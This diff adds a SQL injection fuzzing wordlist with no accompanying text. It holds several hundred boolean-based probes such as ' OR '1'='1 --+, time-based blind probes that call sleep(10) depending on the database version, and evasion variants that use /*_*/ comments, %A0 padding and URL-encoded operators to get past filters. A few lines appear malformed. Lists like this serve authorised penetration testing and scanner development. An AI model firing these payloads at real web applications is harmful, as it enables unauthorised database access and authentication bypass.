@@ -1,0 +1,624 @@
+--+
+--%20
+--
+-- -
+/*
+#
+%23
+;%00
+')--+
+') AND 1 --+
+') AND 0 --+
+') OR 1 --+
+') OR 0 --+
+') AND '1'='1 --+
+') OR '1'='1 --+
+' AND 1 --+
+' AND 0 --+
+' OR 1 --+
+' OR 0 --+
+' AND '1'='1 --+
+' OR '1'='1 --+
+") --+
+") AND 1 --+
+") AND 0 --+
+") OR 1 --+
+") OR 0 --+
+") AND "1"="1 --+
+") OR "1"="1 --+
+" AND 1 --+
+" AND 0 --+
+" OR 1 --+
+" OR 0 --+
+" AND "1"="1 --+
+" OR "1"="1 --+
+') #
+') AND 1 #
+') AND 0 #
+') OR 1 #
+') OR 0 #
+') AND '1'='1 #
+') OR '1'='1 #
+' AND 1 #
+' AND 0 #
+' OR 1 #
+' OR 0 #
+' AND '1'='1 #
+' OR '1'='1 #
+") #
+") AND 1 #
+") AND 0 #
+") OR 1 #
+") OR 0 #
+") AND "1"="1 #
+") OR "1"="1 #
+" AND 1 #
+" AND 0 #
+" OR 1 #
+" OR 0 #
+" AND "1"="1 #
+" OR "1"="1 #
+')) --+
+')) AND 1 --+
+')) AND 0 --+
+')) OR 1 --+
+')) OR 0 --+
+')) AND '1'='1 --+
+')) OR '1'='1 --+
+")) --+
+")) AND 1 --+
+")) AND 0 --+
+")) OR 1 --+
+")) OR 0 --+
+")) AND "1"="1 --+
+")) OR "1"="1 --+
+')#
+') AND 1 #
+') AND 0 #
+') OR 1 #
+') OR 0 #
+') AND '1'='1 #
+') OR '1'='1 #
+") #
+") AND 1 #
+") AND 0 #
+") OR 1 #
+") OR 0 #
+") AND "1"="1 #
+") OR "1"="1 #
+')/*_*/AND/*_*/1/*_*/--+
+')/*_*/AND/*_*/0/*_*/--+
+')/*_*/OR/*_*/1/*_*/--+
+')/*_*/OR/*_*/0/*_*/--+
+')/*_*/AND/*_*/'1'='1/*_*/--+
+')/*_*/OR/*_*/'1'='1/*_*/--+
+'/*_*/AND/*_*/1/*_*/--+
+'/*_*/AND/*_*/0/*_*/--+
+'/*_*/OR/*_*/1/*_*/--+
+'/*_*/OR/*_*/0/*_*/--+
+'/*_*/AND/*_*/'1'='1/*_*/--+
+'/*_*/OR/*_*/'1'='1/*_*/--+
+")/*_*/--+
+")/*_*/AND/*_*/1/*_*/--+
+")/*_*/AND/*_*/0/*_*/--+
+")/*_*/OR/*_*/1/*_*/--+
+")/*_*/OR/*_*/0/*_*/--+
+")/*_*/AND/*_*/"1"="1/*_*/--+
+")/*_*/OR/*_*/"1"="1/*_*/--+
+"/*_*/AND/*_*/1/*_*/--+
+"/*_*/AND/*_*/0/*_*/--+
+"/*_*/OR/*_*/1/*_*/--+
+"/*_*/OR/*_*/0/*_*/--+
+"/*_*/AND/*_*/"1"="1/*_*/--+
+"/*_*/OR/*_*/"1"="1/*_*/--+
+')/*_*/#
+')/*_*/AND/*_*/1/*_*/#
+')/*_*/AND/*_*/0/*_*/#
+')/*_*/OR/*_*/1/*_*/#
+')/*_*/OR/*_*/0/*_*/#
+')/*_*/AND/*_*/'1'='1/*_*/#
+')/*_*/OR/*_*/'1'='1/*_*/#
+'/*_*/AND/*_*/1/*_*/#
+'/*_*/AND/*_*/0/*_*/#
+'/*_*/OR/*_*/1/*_*/#
+'/*_*/OR/*_*/0/*_*/#
+'/*_*/AND/*_*/'1'='1/*_*/#
+'/*_*/OR/*_*/'1'='1/*_*/#
+")/*_*/#
+")/*_*/AND/*_*/1/*_*/#
+")/*_*/AND/*_*/0/*_*/#
+")/*_*/OR/*_*/1/*_*/#
+")/*_*/OR/*_*/0/*_*/#
+")/*_*/AND/*_*/"1"="1/*_*/#
+")/*_*/OR/*_*/"1"="1/*_*/#
+"/*_*/AND/*_*/1/*_*/#
+"/*_*/AND/*_*/0/*_*/#
+"/*_*/OR/*_*/1/*_*/#
+"/*_*/OR/*_*/0/*_*/#
+"/*_*/AND/*_*/"1"="1/*_*/#
+"/*_*/OR/*_*/"1"="1/*_*/#
+'))/*_*/--+
+'))/*_*/AND/*_*/1/*_*/--+
+'))/*_*/AND/*_*/0/*_*/--+
+'))/*_*/OR/*_*/1/*_*/--+
+'))/*_*/OR/*_*/0/*_*/--+
+'))/*_*/AND/*_*/'1'='1/*_*/--+
+'))/*_*/OR/*_*/'1'='1/*_*/--+
+"))/*_*/--+
+"))/*_*/AND/*_*/1/*_*/--+
+"))/*_*/AND/*_*/0/*_*/--+
+"))/*_*/OR/*_*/1/*_*/--+
+"))/*_*/OR/*_*/0/*_*/--+
+"))/*_*/AND/*_*/"1"="1/*_*/--+
+"))/*_*/OR/*_*/"1"="1/*_*/--+
+')/*_*/AND/*_*/1/*_*/#
+')/*_*/AND/*_*/0/*_*/#
+')/*_*/OR/*_*/1/*_*/#
+')/*_*/OR/*_*/0/*_*/#
+')/*_*/AND/*_*/'1'='1/*_*/#
+')/*_*/OR/*_*/'1'='1/*_*/#
+")/*_*/#
+")/*_*/AND/*_*/1/*_*/#
+")/*_*/AND/*_*/0/*_*/#
+")/*_*/OR/*_*/1/*_*/#
+")/*_*/OR/*_*/0/*_*/#
+")/*_*/AND/*_*/"1"="1/*_*/#
+")/*_*/OR/*_*/"1"="1/*_*/#
+') AND if((select version()) like "x%",null,sleep(10)) --+
+') OR if((select version()) like "x%",null,sleep(10)) --+
+' AND if((select version()) like "x%",null,sleep(10)) --+
+' OR if((select version()) like "x%",null,sleep(10)) --+
+") AND if((select version()) like "x%",null,sleep(10)) --+
+") OR if((select version()) like "x%",null,sleep(10)) --+
+" AND if((select version()) like "x%",null,sleep(10)) --+
+" OR if((select version()) like "x%",null,sleep(10)) --+
+') AND if((select version()) like "x%",null,sleep(10)) #
+') OR if((select version()) like "x%",null,sleep(10)) #
+' AND if((select version()) like "x%",null,sleep(10)) #
+' OR if((select version()) like "x%",null,sleep(10)) #
+") AND if((select version()) like "x%",null,sleep(10)) #
+") OR if((select version()) like "x%",null,sleep(10)) #
+" AND if((select version()) like "x%",null,sleep(10)) #
+" OR if((select version()) like "x%",null,sleep(10)) #
+')) AND if((select version()) like "x%",null,sleep(10)) --+
+')) OR if((select version()) like "x%",null,sleep(10)) --+
+")) AND if((select version()) like "x%",null,sleep(10)) --+
+")) OR if((select version()) like "x%",null,sleep(10)) --+
+') AND if((select version()) like "x%",null,sleep(10)) #
+') OR if((select version()) like "x%",null,sleep(10)) #
+") AND if((select version()) like "x%",null,sleep(10)) #
+") OR if((select version()) like "x%",null,sleep(10)) #
+')/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+')/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+'/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+'/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+")/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+")/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+"/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+"/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+')/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+')/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+'/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+'/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+")/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+")/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+"/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+"/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+'))/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+'))/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+"))/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+"))/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+')/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+')/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+")/*_*/AND/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+")/*_*/OR/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+') %26%26 1 --+
+') %26%26 0 --+
+')  || 1 --+
+')  || 0 --+
+') %26%26 '1'='1 --+
+')  || '1'='1 --+
+' %26%26 1 --+
+' %26%26 0 --+
+'  || 1 --+
+'  || 0 --+
+' %26%26 '1'='1 --+
+'  || '1'='1 --+
+") --+
+") %26%26 1 --+
+") %26%26 0 --+
+")  || 1 --+
+")  || 0 --+
+") %26%26 "1"="1 --+
+")  || "1"="1 --+
+" %26%26 1 --+
+" %26%26 0 --+
+"  || 1 --+
+"  || 0 --+
+" %26%26 "1"="1 --+
+"  || "1"="1 --+
+') #
+') %26%26 1 #
+') %26%26 0 #
+')  || 1 #
+')  || 0 #
+') %26%26 '1'='1 #
+')  || '1'='1 #
+' %26%26 1 #
+' %26%26 0 #
+'  || 1 #
+'  || 0 #
+' %26%26 '1'='1 #
+'  || '1'='1 #
+") #
+") %26%26 1 #
+") %26%26 0 #
+")  || 1 #
+")  || 0 #
+") %26%26 "1"="1 #
+")  || "1"="1 #
+" %26%26 1 #
+" %26%26 0 #
+"  || 1 #
+"  || 0 #
+" %26%26 "1"="1 #
+"  || "1"="1 #
+')) --+
+')) %26%26 1 --+
+')) %26%26 0 --+
+'))  || 1 --+
+'))  || 0 --+
+')) %26%26 '1'='1 --+
+'))  || '1'='1 --+
+")) --+
+")) %26%26 1 --+
+")) %26%26 0 --+
+"))  || 1 --+
+"))  || 0 --+
+")) %26%26 "1"="1 --+
+"))  || "1"="1 --+
+')#
+') %26%26 1 #
+') %26%26 0 #
+')  || 1 #
+')  || 0 #
+') %26%26 '1'='1 #
+')  || '1'='1 #
+") #
+") %26%26 1 #
+") %26%26 0 #
+")  || 1 #
+")  || 0 #
+") %26%26 "1"="1 #
+")  || "1"="1 #
+')/*_*/%26%26/*_*/1/*_*/--+
+')/*_*/%26%26/*_*/0/*_*/--+
+')/*_*/||/*_*/1/*_*/--+
+')/*_*/||/*_*/0/*_*/--+
+')/*_*/%26%26/*_*/'1'='1/*_*/--+
+')/*_*/||/*_*/'1'='1/*_*/--+
+'/*_*/%26%26/*_*/1/*_*/--+
+'/*_*/%26%26/*_*/0/*_*/--+
+'/*_*/||/*_*/1/*_*/--+
+'/*_*/||/*_*/0/*_*/--+
+'/*_*/%26%26/*_*/'1'='1/*_*/--+
+'/*_*/||/*_*/'1'='1/*_*/--+
+")/*_*/--+
+")/*_*/%26%26/*_*/1/*_*/--+
+")/*_*/%26%26/*_*/0/*_*/--+
+")/*_*/||/*_*/1/*_*/--+
+")/*_*/||/*_*/0/*_*/--+
+")/*_*/%26%26/*_*/"1"="1/*_*/--+
+")/*_*/||/*_*/"1"="1/*_*/--+
+"/*_*/%26%26/*_*/1/*_*/--+
+"/*_*/%26%26/*_*/0/*_*/--+
+"/*_*/||/*_*/1/*_*/--+
+"/*_*/||/*_*/0/*_*/--+
+"/*_*/%26%26/*_*/"1"="1/*_*/--+
+"/*_*/||/*_*/"1"="1/*_*/--+
+')/*_*/#
+')/*_*/%26%26/*_*/1/*_*/#
+')/*_*/%26%26/*_*/0/*_*/#
+')/*_*/||/*_*/1/*_*/#
+')/*_*/||/*_*/0/*_*/#
+')/*_*/%26%26/*_*/'1'='1/*_*/#
+')/*_*/||/*_*/'1'='1/*_*/#
+'/*_*/%26%26/*_*/1/*_*/#
+'/*_*/%26%26/*_*/0/*_*/#
+'/*_*/||/*_*/1/*_*/#
+'/*_*/||/*_*/0/*_*/#
+'/*_*/%26%26/*_*/'1'='1/*_*/#
+'/*_*/||/*_*/'1'='1/*_*/#
+")/*_*/#
+")/*_*/%26%26/*_*/1/*_*/#
+")/*_*/%26%26/*_*/0/*_*/#
+")/*_*/||/*_*/1/*_*/#
+")/*_*/||/*_*/0/*_*/#
+")/*_*/%26%26/*_*/"1"="1/*_*/#
+")/*_*/||/*_*/"1"="1/*_*/#
+"/*_*/%26%26/*_*/1/*_*/#
+"/*_*/%26%26/*_*/0/*_*/#
+"/*_*/||/*_*/1/*_*/#
+"/*_*/||/*_*/0/*_*/#
+"/*_*/%26%26/*_*/"1"="1/*_*/#
+"/*_*/||/*_*/"1"="1/*_*/#
+'))/*_*/--+
+'))/*_*/%26%26/*_*/1/*_*/--+
+'))/*_*/%26%26/*_*/0/*_*/--+
+'))/*_*/||/*_*/1/*_*/--+
+'))/*_*/||/*_*/0/*_*/--+
+'))/*_*/%26%26/*_*/'1'='1/*_*/--+
+'))/*_*/||/*_*/'1'='1/*_*/--+
+"))/*_*/--+
+"))/*_*/%26%26/*_*/1/*_*/--+
+"))/*_*/%26%26/*_*/0/*_*/--+
+"))/*_*/||/*_*/1/*_*/--+
+"))/*_*/||/*_*/0/*_*/--+
+"))/*_*/%26%26/*_*/"1"="1/*_*/--+
+"))/*_*/||/*_*/"1"="1/*_*/--+
+')/*_*/%26%26/*_*/1/*_*/#
+')/*_*/%26%26/*_*/0/*_*/#
+')/*_*/||/*_*/1/*_*/#
+')/*_*/||/*_*/0/*_*/#
+')/*_*/%26%26/*_*/'1'='1/*_*/#
+')/*_*/||/*_*/'1'='1/*_*/#
+")/*_*/#
+")/*_*/%26%26/*_*/1/*_*/#
+")/*_*/%26%26/*_*/0/*_*/#
+")/*_*/||/*_*/1/*_*/#
+")/*_*/||/*_*/0/*_*/#
+")/*_*/%26%26/*_*/"1"="1/*_*/#
+")/*_*/||/*_*/"1"="1/*_*/#
+') %26%26 if((select version()) like "x%",null,sleep(10)) --+
+')  || if((select version()) like "x%",null,sleep(10)) --+
+' %26%26 if((select version()) like "x%",null,sleep(10)) --+
+'  || if((select version()) like "x%",null,sleep(10)) --+
+") %26%26 if((select version()) like "x%",null,sleep(10)) --+
+")  || if((select version()) like "x%",null,sleep(10)) --+
+" %26%26 if((select version()) like "x%",null,sleep(10)) --+
+"  || if((select version()) like "x%",null,sleep(10)) --+
+') %26%26 if((select version()) like "x%",null,sleep(10)) #
+')  || if((select version()) like "x%",null,sleep(10)) #
+' %26%26 if((select version()) like "x%",null,sleep(10)) #
+'  || if((select version()) like "x%",null,sleep(10)) #
+") %26%26 if((select version()) like "x%",null,sleep(10)) #
+")  || if((select version()) like "x%",null,sleep(10)) #
+" %26%26 if((select version()) like "x%",null,sleep(10)) #
+"  || if((select version()) like "x%",null,sleep(10)) #
+')) %26%26 if((select version()) like "x%",null,sleep(10)) --+
+'))  || if((select version()) like "x%",null,sleep(10)) --+
+")) %26%26 if((select version()) like "x%",null,sleep(10)) --+
+"))  || if((select version()) like "x%",null,sleep(10)) --+
+') %26%26 if((select version()) like "x%",null,sleep(10)) #
+')  || if((select version()) like "x%",null,sleep(10)) #
+") %26%26 if((select version()) like "x%",null,sleep(10)) #
+")  || if((select version()) like "x%",null,sleep(10)) #
+')/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+')/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+'/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+'/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+")/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+")/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+"/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+"/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+')/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+')/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+'/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+'/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+")/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+")/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+"/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+"/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+'))/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+'))/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+"))/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+"))/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/--+
+')/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+')/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+")/*_*/%26%26/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+")/*_*/ ||/*_*/if((select/*_*/version())/*_*/like/*_*/"x%",null,sleep(10))/*_*/#
+')%A0AND%A01%A0--+
+')%A0AND%A00%A0--+
+')%A0OR%A01%A0--+
+')%A0OR%A00%A0--+
+')%A0AND%A0'1'='1%A0--+
+')%A0OR%A0'1'='1%A0--+
+'%A0AND%A01%A0--+
+'%A0AND%A00%A0--+
+'%A0OR%A01%A0--+
+'%A0OR%A00%A0--+
+'%A0AND%A0'1'='1%A0--+
+'%A0OR%A0'1'='1%A0--+
+")%A0--+
+")%A0AND%A01%A0--+
+")%A0AND%A00%A0--+
+")%A0OR%A01%A0--+
+")%A0OR%A00%A0--+
+")%A0AND%A0"1"="1%A0--+
+")%A0OR%A0"1"="1%A0--+
+"%A0AND%A01%A0--+
+"%A0AND%A00%A0--+
+"%A0OR%A01%A0--+
+"%A0OR%A00%A0--+
+"%A0AND%A0"1"="1%A0--+
+"%A0OR%A0"1"="1%A0--+
+')%A0#
+')%A0AND%A01%A0#
+')%A0AND%A00%A0#
+')%A0OR%A01%A0#
+')%A0OR%A00%A0#
+')%A0AND%A0'1'='1%A0#
+')%A0OR%A0'1'='1%A0#
+'%A0AND%A01%A0#
+'%A0AND%A00%A0#
+'%A0OR%A01%A0#
+'%A0OR%A00%A0#
+'%A0AND%A0'1'='1%A0#
+'%A0OR%A0'1'='1%A0#
+")%A0#
+")%A0AND%A01%A0#
+")%A0AND%A00%A0#
+")%A0OR%A01%A0#
+")%A0OR%A00%A0#
+")%A0AND%A0"1"="1%A0#
+")%A0OR%A0"1"="1%A0#
+"%A0AND%A01%A0#
+"%A0AND%A00%A0#
+"%A0OR%A01%A0#
+"%A0OR%A00%A0#
+"%A0AND%A0"1"="1%A0#
+"%A0OR%A0"1"="1%A0#
+'))%A0--+
+'))%A0AND%A01%A0--+
+'))%A0AND%A00%A0--+
+'))%A0OR%A01%A0--+
+'))%A0OR%A00%A0--+
+'))%A0AND%A0'1'='1%A0--+
+'))%A0OR%A0'1'='1%A0--+
+"))%A0--+
+"))%A0AND%A01%A0--+
+"))%A0AND%A00%A0--+
+"))%A0OR%A01%A0--+
+"))%A0OR%A00%A0--+
+"))%A0AND%A0"1"="1%A0--+
+"))%A0OR%A0"1"="1%A0--+
+')%A0AND%A01%A0#
+')%A0AND%A00%A0#
+')%A0OR%A01%A0#
+')%A0OR%A00%A0#
+')%A0AND%A0'1'='1%A0#
+')%A0OR%A0'1'='1%A0#
+")%A0#
+")%A0AND%A01%A0#
+")%A0AND%A00%A0#
+")%A0OR%A01%A0#
+")%A0OR%A00%A0#
+")%A0AND%A0"1"="1%A0#
+")%A0OR%A0"1"="1%A0#
+')%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+')%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+'%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+'%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+")%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+")%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+"%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+"%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+')%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+')%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+'%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+'%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+")%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+")%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+"%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+"%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+'))%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+'))%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+"))%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+"))%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+')%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+')%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+")%A0AND%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+")%A0OR%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+')%A0%26%26%A01%A0--+
+')%A0%26%26%A00%A0--+
+')%A0||%A01%A0--+
+')%A0||%A00%A0--+
+')%A0%26%26%A0'1'='1%A0--+
+')%A0||%A0'1'='1%A0--+
+'%A0%26%26%A01%A0--+
+'%A0%26%26%A00%A0--+
+'%A0||%A01%A0--+
+'%A0||%A00%A0--+
+'%A0%26%26%A0'1'='1%A0--+
+'%A0||%A0'1'='1%A0--+
+")%A0--+
+")%A0%26%26%A01%A0--+
+")%A0%26%26%A00%A0--+
+")%A0||%A01%A0--+
+")%A0||%A00%A0--+
+")%A0%26%26%A0"1"="1%A0--+
+")%A0||%A0"1"="1%A0--+
+"%A0%26%26%A01%A0--+
+"%A0%26%26%A00%A0--+
+"%A0||%A01%A0--+
+"%A0||%A00%A0--+
+"%A0%26%26%A0"1"="1%A0--+
+"%A0||%A0"1"="1%A0--+
+')%A0#
+')%A0%26%26%A01%A0#
+')%A0%26%26%A00%A0#
+')%A0||%A01%A0#
+')%A0||%A00%A0#
+')%A0%26%26%A0'1'='1%A0#
+')%A0||%A0'1'='1%A0#
+'%A0%26%26%A01%A0#
+'%A0%26%26%A00%A0#
+'%A0||%A01%A0#
+'%A0||%A00%A0#
+'%A0%26%26%A0'1'='1%A0#
+'%A0||%A0'1'='1%A0#
+")%A0#
+")%A0%26%26%A01%A0#
+")%A0%26%26%A00%A0#
+")%A0||%A01%A0#
+")%A0||%A00%A0#
+")%A0%26%26%A0"1"="1%A0#
+")%A0||%A0"1"="1%A0#
+"%A0%26%26%A01%A0#
+"%A0%26%26%A00%A0#
+"%A0||%A01%A0#
+"%A0||%A00%A0#
+"%A0%26%26%A0"1"="1%A0#
+"%A0||%A0"1"="1%A0#
+'))%A0--+
+'))%A0%26%26%A01%A0--+
+'))%A0%26%26%A00%A0--+
+'))%A0||%A01%A0--+
+'))%A0||%A00%A0--+
+'))%A0%26%26%A0'1'='1%A0--+
+'))%A0||%A0'1'='1%A0--+
+"))%A0--+
+"))%A0%26%26%A01%A0--+
+"))%A0%26%26%A00%A0--+
+"))%A0||%A01%A0--+
+"))%A0||%A00%A0--+
+"))%A0%26%26%A0"1"="1%A0--+
+"))%A0||%A0"1"="1%A0--+
+')%A0%26%26%A01%A0#
+')%A0%26%26%A00%A0#
+')%A0||%A01%A0#
+')%A0||%A00%A0#
+')%A0%26%26%A0'1'='1%A0#
+')%A0||%A0'1'='1%A0#
+")%A0#
+")%A0%26%26%A01%A0#
+")%A0%26%26%A00%A0#
+")%A0||%A01%A0#
+")%A0||%A00%A0#
+")%A0%26%26%A0"1"="1%A0#
+")%A0||%A0"1"="1%A0#)#
+")||if((selectversion())like"x%",null,sleep(10))#
+')%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+')%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+'%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+'%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+")%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+")%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+"%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+"%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+')%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+')%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+'%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+'%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+")%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+")%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+"%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+"%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+'))%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+'))%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+"))%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+"))%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0--+
+')%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+')%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+")%A0%26%26%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
+")%A0||%A0if((select%A0version())%A0like%A0"x%",null,sleep(10))%A0#
